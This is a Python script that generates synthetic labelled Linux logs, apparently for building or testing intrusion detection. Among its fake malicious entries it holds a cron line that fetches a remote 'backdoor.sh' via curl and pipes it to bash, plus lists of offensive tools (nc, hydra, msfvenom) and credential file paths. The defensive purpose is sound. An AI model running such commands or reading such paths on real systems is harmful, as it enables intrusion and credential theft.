import random
import time
import uuid
import ipaddress
import argparse
from datetime import datetime, timedelta
import csv
import re

class LinuxLogGenerator:
    def __init__(self, start_date=None, num_users=10, num_servers=5):
        self.users = [f"user{i}" for i in range(1, num_users+1)]
        self.admins = ["admin", "root", "sysadmin"]
        self.all_users = self.users + self.admins

        self.servers = [f"srv{i:02d}" for i in range(1, num_servers+1)]
        self.hostnames = ["kali", "workstation"] + self.servers

        self.services = ["sshd", "sudo", "su", "login", "systemd", "cron", "nginx",
                        "apache2", "mysqld", "postfix", "dovecot", "firewalld"]

        self.normal_paths = [
            "/var/log", "/etc/passwd", "/etc/shadow", "/var/www",
            "/home", "/var/lib", "/usr/bin", "/usr/sbin", "/var/spool",
            "/opt", "/srv", "/mnt", "/media", "/tmp"
        ]

        self.sensitive_paths = [
            "/etc/shadow", "/root/.ssh", "/etc/ssl/private",
            "/var/lib/mysql", "/etc/kubernetes/admin.conf",
            "/home/admin/.aws/credentials", "/etc/sudoers",
            "/etc/ssh/ssh_host_rsa_key", "/var/backups",
            "/etc/ssl/private", "/root/.bash_history"
        ]

        self.normal_commands = [
            "ls", "cd", "cp", "mv", "cat", "grep", "find", "top", "ps",
            "df", "du", "free", "who", "w", "uptime", "date", "systemctl"
        ]

        self.suspicious_commands = [
            "chmod 777", "wget", "curl", "nc", "netcat", "nmap", "tcpdump",
            "dd if=/dev/zero", "pkill", "killall", "./exploit", "base64",
            "hydra", "john", "aircrack-ng", "hashcat", "metasploit",
            "msfconsole", "msfvenom", "wireshark", "tshark"
        ]

        self.internal_ips = [str(ip) for ip in ipaddress.IPv4Network("10.0.0.0/16").hosts()][:100]
        self.external_ips = [
            str(ipaddress.IPv4Address(random.randint(1, 2**32-1)))
            for _ in range(50)
        ]

        self.current_time = start_date if start_date else datetime.now()
        self.pids = list(range(100, 500000))

        self.user_activity = {}
        for user in self.all_users:
            start_hour = random.randint(7, 9)
            end_hour = random.randint(16, 19)
            self.user_activity[user] = {
                'active_hours': (start_hour, end_hour),
                'usual_ips': random.sample(self.internal_ips, random.randint(1, 3)),
                'usual_commands': random.sample(self.normal_commands, random.randint(5, len(self.normal_commands))),
                'session_count': 0
            }

    def _get_datetime(self):
         # Return the full datetime object
        return self.current_time

    def _advance_time(self, seconds=None):
        if seconds is None:
            seconds = random.randint(1, 300)
        self.current_time += timedelta(seconds=seconds)
        return self._get_datetime()

    def _random_pid(self):
        return random.choice(self.pids)

    def _random_hostname(self):
        return random.choice(self.hostnames)

    def _is_within_working_hours(self, user):
        hour = self.current_time.hour
        start, end = self.user_activity[user]['active_hours']
        return start <= hour <= end

    def _create_log_entry(self, **kwargs):
        # Helper to create a dictionary for the log entry
        entry = {
            "datetime": None, "hostname": None, "process": None, "pid": None,
            "user": None, "source_ip": None, "source_port": None,
            "dest_ip": None, "dest_port": None, "protocol": None,
            "command": None, "file_path": None, "action": None,
            "status": None, "tty": None, "session_id": None,
            "message": None, "raw_log": None, "label": None
        }
        entry.update(kwargs)
        # Format datetime if present
        if entry["datetime"]:
            entry["timestamp_str"] = entry["datetime"].strftime("%Y-%m-%d %H:%M:%S") # Add a string timestamp for CSV
        else:
            entry["timestamp_str"] = ""
        return entry

    def generate_ssh_login(self, malicious_rate=0.05):
        hostname = self._random_hostname()
        timestamp_dt = self._get_datetime() # Get datetime object
        pid = self._random_pid()
        port = random.randint(30000, 65000)
        process = "sshd"

        is_malicious = random.random() < malicious_rate
        label = 1 if is_malicious else 0

        if is_malicious:
            target_user = random.choice(self.all_users)
            source_ip = random.choice(self.external_ips)
            success = random.random() < 0.1
            status = "Accepted" if success else "Failed"
            message = f"{status} password for {target_user} from {source_ip} port {port} ssh2"
            raw_log = f"{timestamp_dt.strftime('%b %d %H:%M:%S')} {hostname} {process}[{pid}]: {message}"

            return self._create_log_entry(
                datetime=timestamp_dt, hostname=hostname, process=process, pid=pid,
                user=target_user, source_ip=source_ip, source_port=port,
                status=status, message=message, raw_log=raw_log, label=label
            )
        else:
            user = random.choice(self.all_users)
            is_working_hours = self._is_within_working_hours(user)
            success_rate = 0.95

            if is_working_hours:
                success = random.random() < success_rate
                source_ip = random.choice(self.user_activity[user]['usual_ips'])
            else:
                success = random.random() < (success_rate * 0.7)
                if random.random() < 0.2:
                    source_ip = random.choice(self.internal_ips)
                else:
                    source_ip = random.choice(self.user_activity[user]['usual_ips'])

            status = "Accepted" if success else "Failed"
            message = f"{status} password for {user} from {source_ip} port {port} ssh2"
            raw_log = f"{timestamp_dt.strftime('%b %d %H:%M:%S')} {hostname} {process}[{pid}]: {message}"

            return self._create_log_entry(
                datetime=timestamp_dt, hostname=hostname, process=process, pid=pid,
                user=user, source_ip=source_ip, source_port=port,
                status=status, message=message, raw_log=raw_log, label=label
            )

    def generate_sudo_command(self, malicious_rate=0.05):
        hostname = self._random_hostname()
        timestamp_dt = self._get_datetime()
        pid = self._random_pid()
        process = "sudo"
        tty = f"pts/{random.randint(0, 10)}"

        is_malicious = random.random() < malicious_rate
        label = 1 if is_malicious else 0

        if is_malicious:
            user = random.choice(self.users)
            target_user = random.choice(self.admins)
            command = random.choice(self.suspicious_commands)
            pwd = f"/home/{user}"
            log_type = random.randint(1, 3)

            if log_type == 1:
                status = "USER NOT IN SUDOERS"
                message = f"{user} : user NOT in sudoers ; TTY={tty} ; PWD={pwd} ; USER={target_user} ; COMMAND={command}"
            elif log_type == 2:
                status = "INCORRECT PASSWORD (3 attempts)"
                message = f"{user} : 3 incorrect password attempts ; TTY={tty} ; PWD={pwd} ; USER=root ; COMMAND={command}"
            else: # PAM failure
                process = "sudo" # Could be pam_unix related
                status = "AUTH FAILURE"
                message = f"pam_unix(sudo:auth): authentication failure; logname={user} uid={random.randint(1000, 5000)} euid=0 tty=/dev/{tty} ruser={user} rhost= user={target_user}"

            raw_log = f"{timestamp_dt.strftime('%b %d %H:%M:%S')} {hostname} {process}[{pid}]: {message}"

            return self._create_log_entry(
                datetime=timestamp_dt, hostname=hostname, process=process, pid=pid,
                user=user, tty=tty, command=command, status=status,
                message=message, raw_log=raw_log, label=label
            )
        else:
            if random.random() < 0.7:
                user = random.choice(self.admins)
            else:
                user = random.choice(self.users)
            command = random.choice(self.normal_commands)
            pwd = f"/home/{user}" # Approximate PWD
            target_user = "root"
            log_type = random.randint(1, 3)
            status = "Success" # Assuming success for normal logs here for simplicity

            if log_type == 1:
                message = f"{user} : TTY={tty} ; PWD={pwd} ; USER={target_user} ; COMMAND=/usr/bin/{command}"
            elif log_type == 2:
                process = "sudo" # Could be pam_unix
                message = f"pam_unix(sudo:session): session opened for user {target_user} by {user}(uid={random.randint(1000, 5000)})"
                status = "SESSION OPENED"
            else:
                process = "sudo" # Could be pam_unix
                message = f"pam_unix(sudo:session): session closed for user {target_user}"
                status = "SESSION CLOSED"

            raw_log = f"{timestamp_dt.strftime('%b %d %H:%M:%S')} {hostname} {process}[{pid}]: {message}"

            return self._create_log_entry(
                datetime=timestamp_dt, hostname=hostname, process=process, pid=pid,
                user=user, tty=tty, command=command if log_type==1 else None, status=status,
                message=message, raw_log=raw_log, label=label
            )

    def generate_file_access(self, malicious_rate=0.05):
        # Note: File access logs are often more complex (e.g., auditd). This is simplified.
        hostname = self._random_hostname()
        timestamp_dt = self._get_datetime()
        pid = self._random_pid()
        process = "audit" # Assuming auditd format
        tty = f"pts/{random.randint(0, 10)}"
        session_id = random.randint(1, 100)
        uid = random.randint(1000, 5000) # Simplified UID/AUID
        addr = random.choice(self.internal_ips) # Simplified address

        is_malicious = random.random() < malicious_rate
        label = 1 if is_malicious else 0

        if is_malicious:
            user = random.choice(self.users)
            file_path = random.choice(self.sensitive_paths)
            action = random.choice(["read", "DENIED", "write"]) # More emphasis on sensitive actions
            status = "DENIED" if action == "DENIED" else "Accessed" # Simplified status

            msg = f'op={action} path="{file_path}" hostname={hostname} addr={addr} terminal={tty}'
            raw_log = f"{timestamp_dt.strftime('%b %d %H:%M:%S')} {hostname} {process}[{pid}]: USER_ACCT pid={pid} uid={uid} auid={uid} ses={session_id} msg='{msg}' user={user}"

            return self._create_log_entry(
                datetime=timestamp_dt, hostname=hostname, process=process, pid=pid,
                user=user, file_path=file_path, action=action, status=status,
                tty=tty, session_id=session_id, source_ip=addr,
                message=msg, raw_log=raw_log, label=label
            )
        else:
            if random.random() < 0.7:
                user = random.choice(self.admins)
                file_path = random.choice(self.sensitive_paths) if random.random() < 0.3 else random.choice(self.normal_paths)
            else:
                user = random.choice(self.users)
                file_path = random.choice(self.normal_paths)

            action = random.choice(["read", "open", "access"])
            status = "Accessed"

            msg = f'op={action} path="{file_path}" hostname={hostname} addr={addr} terminal={tty}'
            raw_log = f"{timestamp_dt.strftime('%b %d %H:%M:%S')} {hostname} {process}[{pid}]: USER_ACCT pid={pid} uid={uid} auid={uid} ses={session_id} msg='{msg}' user={user}"

            return self._create_log_entry(
                datetime=timestamp_dt, hostname=hostname, process=process, pid=pid,
                user=user, file_path=file_path, action=action, status=status,
                tty=tty, session_id=session_id, source_ip=addr,
                message=msg, raw_log=raw_log, label=label
            )

    def generate_network_connection(self, malicious_rate=0.05):
        # Note: Network logs vary greatly (firewall, netfilter, application). Simplified kernel format.
        hostname = self._random_hostname()
        timestamp_dt = self._get_datetime()
        pid = self._random_pid()
        process = "kernel" # Assuming kernel message format for netfilter

        is_malicious = random.random() < malicious_rate
        label = 1 if is_malicious else 0

        if is_malicious:
            source_ip = random.choice(self.internal_ips)
            dest_ip = random.choice(self.external_ips)
            user = random.choice(self.users)
            suspicious_ports = [4444, 8080, 31337, 8888, 9999, 6667, 1080]
            dest_port = random.choice(suspicious_ports)
            source_port = random.randint(40000, 65000)
            protocol = random.choice(["TCP", "UDP"])
            actual_process = random.choice(["nc", "python", "perl", "bash", "sh", "./a.out"]) # Process causing connection
            direction = "OUTBOUND"
            status = "Connection Attempt" # Simplified

            message = f"[NETFILTER] {direction} {protocol} {source_ip}:{source_port} -> {dest_ip}:{dest_port} process={actual_process} user={user}"
            raw_log = f"{timestamp_dt.strftime('%b %d %H:%M:%S')} {hostname} {process}[{pid}]: {message}"

            return self._create_log_entry(
                datetime=timestamp_dt, hostname=hostname, process=process, pid=pid,
                user=user, source_ip=source_ip, source_port=source_port,
                dest_ip=dest_ip, dest_port=dest_port, protocol=protocol, status=status,
                message=message, raw_log=raw_log, label=label, command=actual_process # Use command field for actual process
            )
        else:
            source_ip = random.choice(self.internal_ips)
            if random.random() < 0.7:
                dest_ip = random.choice(self.internal_ips)
                dest_port = random.choice([22, 80, 443, 3306, 389, 636, 445])
            else:
                dest_ip = random.choice(self.external_ips)
                dest_port = random.choice([80, 443, 53, 123])

            source_port = random.randint(40000, 65000)
            protocol = random.choice(["TCP", "UDP"])
            actual_process = random.choice(["sshd", "httpd", "chrome", "firefox", "curl", "wget", "slack", "teams"])
            user = random.choice(self.all_users)
            direction = random.choice(['INBOUND', 'OUTBOUND'])
            status = "Connection" # Simplified

            message = f"[NETFILTER] {direction} {protocol} {source_ip}:{source_port} -> {dest_ip}:{dest_port} process={actual_process} user={user}"
            raw_log = f"{timestamp_dt.strftime('%b %d %H:%M:%S')} {hostname} {process}[{pid}]: {message}"

            return self._create_log_entry(
                datetime=timestamp_dt, hostname=hostname, process=process, pid=pid,
                user=user, source_ip=source_ip, source_port=source_port,
                dest_ip=dest_ip, dest_port=dest_port, protocol=protocol, status=status,
                message=message, raw_log=raw_log, label=label, command=actual_process # Use command field for actual process
            )

    def generate_auth_logs(self, malicious_rate=0.05):
        hostname = self._random_hostname()
        timestamp_dt = self._get_datetime()
        pid = self._random_pid()
        auth_processes = ["login", "su", "systemd-logind", "passwd", "usermod", "useradd"]
        process = random.choice(auth_processes)

        is_malicious = random.random() < malicious_rate
        label = 1 if is_malicious else 0

        log_data = {
            "datetime": timestamp_dt, "hostname": hostname, "process": process,
            "pid": pid, "label": label
        }

        if is_malicious:
            if process == "login":
                user = random.choice(self.users)
                source_ip = random.choice(self.external_ips)
                failures = random.randint(5, 20)
                status = "FAILED LOGIN"
                message = f"{status} ({failures} failures) from {source_ip} for {user}, Authentication failure"
                log_data.update({"user": user, "source_ip": source_ip, "status": status})
            elif process == "su":
                user = random.choice(self.users)
                target = random.choice(self.admins)
                status = "FAILED SU"
                message = f"{status} for {target} by {user} - /bin/su"
                log_data.update({"user": user, "status": status})
            elif process == "useradd":
                user = "root" # Suspicious if root is doing this potentially
                new_user = f"hacker{random.randint(100, 999)}"
                status = "USER ADDED"
                message = f"new user: name={new_user}, UID=0, GID=0, home=/home/{new_user}, shell=/bin/bash, by={user}" # Suspicious UID/GID=0
                log_data.update({"user": user, "status": status})
            else: # Fallback malicious - potentially spoofed session
                process = "systemd-logind"
                user = random.choice(self.users)
                source_ip = random.choice(self.external_ips)
                session_id = random.randint(1000, 9999)
                status = "NEW SESSION (SUSPICIOUS)"
                message = f"New session {session_id} of user {user} from {source_ip}"
                log_data.update({"user": user, "source_ip": source_ip, "session_id": session_id, "status": status, "process": process})

            log_data["message"] = message
            log_data["raw_log"] = f"{timestamp_dt.strftime('%b %d %H:%M:%S')} {hostname} {process}[{pid}]: {message}"
            return self._create_log_entry(**log_data)
        else:
            # Normal authentication logs
            if process == "login":
                user = random.choice(self.all_users)
                source_ip = random.choice(self.user_activity[user]['usual_ips'])
                is_working_hours = self._is_within_working_hours(user)
                if not is_working_hours and random.random() < 0.3:
                     status = "FAILED LOGIN"
                     message = f"{status} (1 failure) from {random.choice(self.internal_ips)} for {user}, Authentication failure"
                else:
                     status = "Successful login"
                     message = f"{status} for {user} from {source_ip}"
                log_data.update({"user": user, "source_ip": source_ip, "status": status})

            elif process == "su":
                 user = random.choice(self.admins) if random.random() < 0.7 else random.choice(self.users)
                 target = "root"
                 if user in self.users and random.random() < 0.2: # Failed su attempt by non-admin
                     status = "FAILED SU"
                 else:
                     status = "Successful su"
                 message = f"{status} for {target} by {user}"
                 log_data.update({"user": user, "status": status})

            elif process == "systemd-logind":
                 user = random.choice(self.all_users)
                 if random.random() < 0.6 and self.user_activity[user]['session_count'] > 0: # Session close
                     session_id = self.user_activity[user]['session_count']
                     self.user_activity[user]['session_count'] -= 1
                     status = "SESSION CLOSED"
                     message = f"Removed session {session_id}." # Simpler message
                     log_data.update({"user": user, "session_id": session_id, "status": status})
                 else: # Session open
                     self.user_activity[user]['session_count'] += 1
                     session_id = self.user_activity[user]['session_count']
                     status = "NEW SESSION"
                     message = f"New session {session_id} of user {user}."
                     log_data.update({"user": user, "session_id": session_id, "status": status})

            elif process == "passwd":
                 user = random.choice(self.all_users)
                 status = "PASSWORD CHANGED"
                 message = f"password changed for {user}"
                 log_data.update({"user": user, "status": status})

            elif process == "usermod":
                 user = random.choice(self.admins)
                 target = random.choice(self.users)
                 group = random.choice(["sudo", "admin", "staff", "developers", "accounting"])
                 status = "GROUP ADDED"
                 message = f"add '{target}' to group '{group}' by user '{user}'"
                 log_data.update({"user": user, "status": status})

            elif process == "useradd":
                 user = random.choice(self.admins)
                 new_user = f"user{random.randint(100, 999)}"
                 status = "USER ADDED"
                 message = f"new user: name={new_user}, UID={random.randint(1000, 5000)}, GID={random.randint(1000, 5000)}, home=/home/{new_user}, shell=/bin/bash, by={user}"
                 log_data.update({"user": user, "status": status})

            log_data["message"] = message
            log_data["raw_log"] = f"{timestamp_dt.strftime('%b %d %H:%M:%S')} {hostname} {process}[{pid}]: {message}"
            return self._create_log_entry(**log_data)


    def generate_system_logs(self, malicious_rate=0.05):
        hostname = self._random_hostname()
        timestamp_dt = self._get_datetime()
        pid = self._random_pid()
        sys_processes = ["systemd", "cron", "kernel", "dpkg", "firewalld"]
        process = random.choice(sys_processes)

        is_malicious = random.random() < malicious_rate
        label = 1 if is_malicious else 0

        log_data = {
            "datetime": timestamp_dt, "hostname": hostname, "process": process,
            "pid": pid, "label": label
        }

        if is_malicious:
            if process == "systemd":
                service = random.choice(self.services)
                status = "KILLED"
                message = f"{service}.service: Process /usr/sbin/{service} exited, code=killed, status=9/KILL"
                log_data.update({"status": status})
            elif process == "cron":
                user = random.choice(self.users)
                suspicious_cmd = f"*/5 * * * * curl -s {random.choice(self.external_ips)}/backdoor.sh | bash"
                status = "CRON ADDED (SUSPICIOUS)"
                message = f"({user}) ADD ({suspicious_cmd})"
                log_data.update({"user": user, "command": suspicious_cmd, "status": status})
            elif process == "kernel":
                status = "SUSPICIOUS MODULE LOADED"
                message = f"suspicious module loaded: name=hidden_module addr=0x{random.randint(0, 16**8):08x} size={random.randint(10000, 50000)}"
                log_data.update({"status": status})
            elif process == "dpkg":
                package = random.choice(["openssh", "sudo", "pam", "systemd", "kernel"])
                status = "PACKAGE INSTALL ERROR"
                message = f"package {package} post-installation script returned error exit status 1"
                log_data.update({"status": status})
            elif process == "firewalld":
                protocol = random.choice(['TCP', 'UDP'])
                source_ip = random.choice(self.external_ips)
                dest_ip = random.choice(self.internal_ips)
                dest_port = random.choice([22, 3389, 445, 139]) # Common internal ports targeted
                status = "DROPPED INVALID"
                message = f"WARNING: DROPPED INVALID {protocol} {source_ip}:{random.randint(1, 65535)} -> {dest_ip}:{dest_port}"
                log_data.update({"protocol": protocol, "source_ip": source_ip, "dest_ip": dest_ip, "dest_port": dest_port, "status": status})

            log_data["message"] = message
            log_data["raw_log"] = f"{timestamp_dt.strftime('%b %d %H:%M:%S')} {hostname} {process}[{pid}]: {message}"
            return self._create_log_entry(**log_data)
        else:
            # Normal system logs
            if process == "systemd":
                service = random.choice(self.services)
                status = "Started" if random.random() < 0.8 else "Stopping"
                message = f"{status} {service}.service."
                log_data.update({"status": status})
            elif process == "cron":
                user = random.choice(self.admins)
                cmd = random.choice([
                    "0 4 * * * /usr/bin/backup.sh", "*/15 * * * * /usr/bin/check_services.sh",
                    "0 0 * * * /usr/bin/logrotate", "30 6 * * * /usr/bin/apt-get update"
                ])
                status = "CRON RELOAD"
                message = f"({user}) RELOAD ({cmd})"
                log_data.update({"user": user, "command": cmd, "status": status})
            elif process == "kernel":
                status = "USB DEVICE DETECTED"
                message = f"usb {random.randint(1, 5)}-{random.randint(1, 5)}: new high-speed USB device number {random.randint(1, 20)} using xhci_hcd"
                log_data.update({"status": status})
            elif process == "dpkg":
                package = random.choice(["tzdata", "bash", "openssl", "python3", "firefox"])
                status = "PACKAGE UNPACKING"
                message = f"Unpacking {package} ({random.randint(1, 10)}.{random.randint(0, 20)}.{random.randint(0, 20)}) over (...)"
                log_data.update({"status": status})
            elif process == "firewalld":
                protocol = random.choice(['TCP', 'UDP'])
                source_ip = random.choice(self.internal_ips)
                dest_ip = random.choice(self.external_ips)
                dest_port = random.choice([80, 443, 53])
                status = "ACCEPT"
                message = f"ACCEPT {protocol} {source_ip}:{random.randint(30000, 65000)} -> {dest_ip}:{dest_port}"
                log_data.update({"protocol": protocol, "source_ip": source_ip, "dest_ip": dest_ip, "dest_port": dest_port, "status": status})

            log_data["message"] = message
            log_data["raw_log"] = f"{timestamp_dt.strftime('%b %d %H:%M:%S')} {hostname} {process}[{pid}]: {message}"
            return self._create_log_entry(**log_data)


    def generate_log_entry(self, malicious_rate=0.05):
        log_generators = [
            self.generate_ssh_login,
            self.generate_sudo_command,
            self.generate_file_access,
            self.generate_network_connection,
            self.generate_auth_logs,
            self.generate_system_logs
        ]
        generator = random.choice(log_generators)
        self._advance_time() # Advance time *before* generating the log
        return generator(malicious_rate=malicious_rate) # Return the dictionary

    def generate_logs(self, num_logs, malicious_percentage=5):
        """Generate a specified number of logs as dictionaries"""
        log_entries = []
        for _ in range(num_logs):
            log_entry_dict = self.generate_log_entry(malicious_rate=malicious_percentage/100)
            log_entries.append(log_entry_dict)
        return log_entries

def main():
    parser = argparse.ArgumentParser(description='Generate synthetic Linux log data for security analysis')
    parser.add_argument('--num_logs', type=int, default=100000, help='Number of log entries to generate') # Reduced default for testing
    parser.add_argument('--output', type=str, default='synthetic_detailed_logs.csv', help='Output CSV file name')
    parser.add_argument('--malicious_percentage', type=float, default=25.0, help='Percentage of malicious logs (0-100)') # Adjusted default
    parser.add_argument('--start_date', type=str, help='Starting date in YYYY-MM-DD format')
    parser.add_argument('--num_users', type=int, default=10, help='Number of regular users')
    parser.add_argument('--num_servers', type=int, default=5, help='Number of servers')

    args = parser.parse_args()

    if args.malicious_percentage < 0 or args.malicious_percentage > 100:
        print("Error: Malicious percentage must be between 0 and 100")
        return

    start_date = None
    if args.start_date:
        try:
            start_date = datetime.strptime(args.start_date, '%Y-%m-%d')
        except ValueError:
            print("Error: Invalid date format. Please use YYYY-MM-DD")
            return

    log_generator = LinuxLogGenerator(
        start_date=start_date,
        num_users=args.num_users,
        num_servers=args.num_servers
    )

    print(f"Generating {args.num_logs} log entries...")
    log_data_list = log_generator.generate_logs(
        args.num_logs,
        malicious_percentage=args.malicious_percentage
    )
    print("Log generation complete.")

    # Define the desired CSV headers in order
    # Ensure all keys used in _create_log_entry are listed here
    headers = [
        "timestamp_str", "hostname", "process", "pid", "user",
        "source_ip", "source_port", "dest_ip", "dest_port", "protocol",
        "command", "file_path", "action", "status", "tty", "session_id",
        "message", "raw_log", "label"
    ]

    print(f"Writing logs to {args.output}...")
    with open(args.output, 'w', newline='', encoding='utf-8') as csvfile:
        csvwriter = csv.DictWriter(csvfile, fieldnames=headers, extrasaction='ignore') # Ignore extra fields not in headers

        # Write header
        csvwriter.writeheader()

        # Write data rows
        for log_entry in log_data_list:
             # Ensure timestamp_str is generated if datetime exists
            if log_entry.get("datetime") and not log_entry.get("timestamp_str"):
                 log_entry["timestamp_str"] = log_entry["datetime"].strftime("%Y-%m-%d %H:%M:%S")
            elif not log_entry.get("timestamp_str"):
                 log_entry["timestamp_str"] = "" # Ensure it exists even if datetime was None

            # Remove the datetime object before writing as it's not directly serializable to CSV
            log_entry_copy = log_entry.copy()
            if 'datetime' in log_entry_copy:
                del log_entry_copy['datetime']

            csvwriter.writerow(log_entry_copy)

    print(f"Successfully generated {args.num_logs} log entries ({args.malicious_percentage}% malicious) and saved detailed logs to {args.output}")

if __name__ == "__main__":
    main()